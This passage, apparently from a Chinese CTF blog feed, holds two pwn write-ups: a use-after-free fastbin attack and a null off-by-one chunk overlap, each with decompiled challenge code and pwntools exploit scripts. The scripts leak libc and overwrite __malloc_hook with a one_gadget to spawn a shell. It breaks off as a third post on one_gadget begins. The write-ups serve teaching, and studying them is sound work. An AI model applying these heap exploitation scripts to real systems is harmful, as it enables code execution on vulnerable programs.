<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">edit</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> nbytes; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  v1 = get_int(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">56</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytes = <span class="number">104</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v1 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(<span class="number">8L</span>L * (v1 - <span class="number">1</span>) + a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your info?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, *(<span class="keyword">void</span> **)(<span class="number">8L</span>L * v4 + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">    *(_QWORD *)(<span class="number">8L</span>L * nbytes - <span class="number">8</span> + a1) = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Edit successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">delete</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want to remove?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  v2 = get_int(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="number">1</span> &amp;&amp; v2 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(<span class="number">8L</span>L * (v2 - <span class="number">1</span>) + a1));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Remove successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shiroha@ubuntu:~/kaohe$ checksec heap</span><br><span class="line">[*] &#x27;/home/gstalker/kaohe/heap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><code>add</code>函数只允许3种堆块<br><code>edit</code>只允许修改两种<br><code>delete</code>也只允许释放两种<br>(那么第三种有什么用啊喂)</p>
<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>由于在<code>delete</code>之后没有讲指针置0,存在**<code>UAF</code>**漏洞,并且在<code>edit</code>的时候没有检查堆块是否已经被<code>free</code>,所以可以通过修改<code>fastbin</code>的<code>fd</code>指针达到任意地址写</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>首先完善一下各个功能</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;3. edit a block&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;3. large&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your info?&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;2. big&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your info?&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;2. big&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>

<h4 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h4><p>一开始我想通过<code>unsorted bin</code>的<code>UAF</code>,但是这里并没有办法(甚至没有<code>unsorted bin</code>)<br>于是试图通过<code>fastbin</code>的<code>fd</code>指针分配到<code>got表</code>附近,泄露<code>libc</code><br>查看一下 <code>got表</code>,寻找合适的size</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:	0x0000000000601e28	0x00007f1287400168</span><br><span class="line">0x602010:	0x00007f12871f0ee0	0x00000000004006a6</span><br><span class="line">0x602020:	0x00007f1286e7e690	0x00000000004006c6</span><br><span class="line">0x602030:	0x00000000004006d6	0x00007f1286f06250</span><br><span class="line">0x602040:	0x00007f1286e2f740	0x00007f1286e93130</span><br><span class="line">0x602050:	0x00007f1286e7ee70	0x0000000000400726</span><br><span class="line">0x602060:	0x0000000000400736	0x0000000000000000</span><br><span class="line">0x602070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602080 &lt;stdout&gt;:	0x00007f12871d4620	0x0000000000000000</span><br><span class="line">0x602090 &lt;stdin&gt;:	0x00007f12871d38e0	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>看到在<code>0x602050</code>的地方有一个 <code>0x70</code>,高兴坏了,然而并不能分配到这里,而且就算是这附近的错位字节也不行(我在这里卡了好久没弄明白为什么,然后看了看<code>__malloc_hook-0x23</code>,发现错位字节的地方是<code>0x7f</code>)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x7f12871d3aed &lt;_IO_wide_data_0+301&gt;:	0x12871d2260000000	0x000000000000007f</span><br><span class="line">0x7f12871d3afd:	0x1286e94e20000000	0x1286e94a0000007f</span><br><span class="line">0x7f12871d3b0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>猜想可能是size检查的时候是一个<code>int</code>为单位,再次寻找size,发现<code>0x602030</code>的地方有一个<code>0x40</code>可以利用,但是会失败,可以分配到,然而<code>0x602038</code>是<code>read</code>函数,会破坏它的指针,从而影响程序<br>最后看到<code>0x602060</code>的地方也有<code>0x40</code>,并且下面存在<code>stdin</code>和<code>stdout</code>可以泄露,将<code>fd</code>指向这里</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x60205a</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">c = sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">addr = u64(c)</span><br><span class="line">print(<span class="string">&quot;addr ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">base = addr - libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]</span><br><span class="line">print(<span class="string">&quot;base ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(base))</span><br></pre></td></tr></table></figure>
<h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><p>得到libc之后使用修改<code>__malloc_hook ==&gt; one_gadget</code> 就可以得到shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">onegadget = base + one[<span class="number">3</span>]</span><br><span class="line">realloc = base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">malloc_hook = base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span> + p64(onegadget) + p64(realloc + <span class="number">0x10</span>))</span><br></pre></td></tr></table></figure>
<p>再一次分配一个堆块就能得到shell</p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>off by one</title>
    <url>//off_by_one.html</url>
    <content><![CDATA[<p>Linux下堆溢出off-by-one实例</p>
<a id="more"></a>

<h2 id="null-off-by-one"><a href="#null-off-by-one" class="headerlink" title="null off by one"></a>null off by one</h2><p><strong>堆题目的解法一直都是有两个指针同时指向同一个chunk</strong></p>
<p>湖南省赛的一道 pwn 为例</p>
<h3 id="null-by-one-介绍"><a href="#null-by-one-介绍" class="headerlink" title="null by one 介绍"></a>null by one 介绍</h3><p>在 add chunk 输入数据之后，在字符串末尾设置 ‘\x00’ ，导致下一个 chunk 的 inuse 位被写入<code>\x00</code> ，从而构造溢出</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h4><h5 id="add"><a href="#add" class="headerlink" title="add"></a>add</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@6</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+8h] [bp-8h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+Ch] [bp-4h]@7</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span> &amp;&amp; <span class="built_in">list</span>[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;list full\n&quot;</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input your name size&quot;</span>);</span><br><span class="line">    v2 = getint();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">256</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">list</span>[i] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;input your name&quot;</span>);</span><br><span class="line">      read_input(<span class="built_in">list</span>[i], v2);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid size&quot;</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="read-input"><a href="#read-input" class="headerlink" title="read_input"></a>read_input</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">_BYTE *__fastcall <span class="title">read_input</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax@6</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+1Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, (<span class="keyword">void</span> *)(i + a1), <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + a1) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = (_BYTE *)(i - <span class="number">1L</span>L + a1);</span><br><span class="line">  *result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点存在于</p>
<p><code>result = (_BYTE *)(i - 1LL + a1);</code><br><code>*result = 0;</code></p>
<h5 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h5><p>假的edit（粗口）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;not implement&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="show"><a href="#show" class="headerlink" title="show"></a>show</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@3</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index&quot;</span>);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">list</span>[v1] )</span><br><span class="line">      <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">list</span>[v1]);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;invalid index&quot;</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@3</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index&quot;</span>);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">list</span>[v1] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)<span class="built_in">list</span>[v1]);</span><br><span class="line">      <span class="built_in">list</span>[v1] = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;invalid index&quot;</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+2Ch] [bp-4h]@2</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = getint();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 &lt;= <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  JUMPOUT(__CS__, (<span class="keyword">char</span> *)dword_FB0 + dword_FB0[(<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点存在于add函数</p>
<h4 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------------------------------------------+</span><br><span class="line">|											|</span><br><span class="line">|				chunk1						|</span><br><span class="line">|											|</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">|											|</span><br><span class="line">|				chunk2						|</span><br><span class="line">|											|</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">|											|</span><br><span class="line">|				chunk3						|</span><br><span class="line">|											|</span><br><span class="line">+-------------------------------------------+</span><br></pre></td></tr></table></figure>

<ul>
<li>三个chunk</li>
<li>free chunk2，此时chunk3 的 prev_size会修改成chunk2的size，同时inuse位置0</li>
<li>add chunk，再次分配到chunk2，修改里面的值，将chunk3的prev_size位写为 chunk1-3 的总大小，同时 inuse位再一次被置0</li>
<li>free chunk1</li>
<li>free chunk3，此时，因为chunk3的inuse位是0，所以向前发生合并，寻找方法是<code>\#define prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p))) </code>，因为前面修改过prev_size，所以会寻找到的是chunk1的头部，于是形成了漏洞</li>
<li>chunk1会进入unsorted bin 中，大小是chunk1-3的总大小，也就是说，是可以覆盖chunk2的，然而chunk2没有被free，所以有两块地址指向了同一个内存空间</li>
</ul>
<h4 id="leak-libc-address"><a href="#leak-libc-address" class="headerlink" title="leak libc address"></a>leak libc address</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;x&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x78</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0xf8</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;p&#x27;</span>*<span class="number">0xf8</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x100</span>*<span class="number">3</span>)+<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">gdb.attach(sh,<span class="string">&quot;heapinfo&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这里构造出了这个漏洞，首先再次拿到chunk4，并且修改掉chunk5的 prev_size 位和 inuse 位，然后 delete 掉了chunk0，chunk5，伪造了一个 unsorted chunk，</p>
<p>这里把0xf8(实际为0x100)的堆块分成了三块，为了之后做题方便，使得 chunk3 进入 fastbin</p>
<p>执行后的结果</p>
<p><a href="http://www.ethushiroha.com/wp-content/uploads/2019/12/a1.png"><img src="http://www.ethushiroha.com/wp-content/uploads/2019/12/a1-300x45.png"></a></p>
<p>顺利的伪造了chunk，然后因为<strong>chunk1没有被free掉</strong>，所以可以通过 <strong>malloc chunk0，把 fd 写入chunk1</strong>(fake top chunk)，然后通过show，暴露出来</p>
<p><a href="http://www.ethushiroha.com/wp-content/uploads/2019/12/a2.png"><img src="http://www.ethushiroha.com/wp-content/uploads/2019/12/a2.png"></a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;x&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x78</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0xf8</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;p&#x27;</span>*<span class="number">0xf8</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#6</span></span><br><span class="line">	</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x100</span>*<span class="number">3</span>)+<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;t&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">gdb.attach(sh,<span class="string">&quot;heapinfo&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">c = sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">add = u64(c)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(add)</span><br><span class="line">base = add-<span class="number">0x3c4b78</span><span class="comment">#static addr</span></span><br><span class="line">libc.address = base</span><br><span class="line">print(<span class="string">&quot;libc ==&gt; %s&quot;</span> %base)</span><br></pre></td></tr></table></figure>

<p>其中0x3c4b78是64位下固定的偏移量(据说)</p>
<p>得到libc的基址，找到 <strong>one_gadget , malloc_hook , realloc_hook , realloc</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook = libc.symbols[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">print(<span class="string">&quot;malloc_hook ==&gt; %s&quot;</span> %<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">print(<span class="string">&#x27;realloc ==&gt; %s&#x27;</span> %<span class="built_in">hex</span>(realloc))</span><br></pre></td></tr></table></figure>

<p>此时，通过 因为 chunk3 在fastbin中，同时也在unsorted bin中，因此，先通过malloc 一个大堆块，伪造chunk3的fd指针</p>
<p><code>add(0xf8,&#39;0&#39;*0x80+p64(0)+p64(0x71)+p64(malloc_hook-0x23))#fake fd</code></p>
<p>伪造后的结果</p>
<p><a href="http://www.ethushiroha.com/wp-content/uploads/2019/12/a3.png"><img src="http://www.ethushiroha.com/wp-content/uploads/2019/12/a3-300x138.png"></a></p>
<p>可以看到顺利的修改了 fd 指针，连接到了malloc_hook-0x23中</p>
<p><a href="http://www.ethushiroha.com/wp-content/uploads/2019/12/a4.png"><img src="http://www.ethushiroha.com/wp-content/uploads/2019/12/a4-300x76.png"></a></p>
<p>之后就是模板了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>)<span class="comment">#malloc fastbin</span></span><br><span class="line">gadgets = <span class="number">0x4526a</span> + libc.address<span class="comment">#one_gadgets</span></span><br><span class="line">print(<span class="string">&quot;gadgets ==&gt; %s&quot;</span> %<span class="built_in">hex</span>(gadgets))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xb</span> + p64(gadgets)+p64(realloc+<span class="number">13</span>))</span><br></pre></td></tr></table></figure>

<p>此时的malloc_hook 如下</p>
<p><a href="http://www.ethushiroha.com/wp-content/uploads/2019/12/a5.png"><img src="http://www.ethushiroha.com/wp-content/uploads/2019/12/a5-300x39.png"></a></p>
<p>此时在执行一次malloc操作，就会按顺序执行</p>
<p> <code>malloc =&gt; malloc_hook =&gt; realloc+13 =&gt; realloc_hook =&gt; gadget</code> </p>
<p>于是拿到shell</p>
<p><a href="http://www.ethushiroha.com/wp-content/uploads/2019/12/a6.png"><img src="http://www.ethushiroha.com/wp-content/uploads/2019/12/a6-300x90.png"></a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>one_gadget条件的探寻</title>
    <url>//one_gadget.html</url>
    <content><![CDATA[<p>one_gadget的条件并没有那么苛刻，有很大的宽限余地</p>
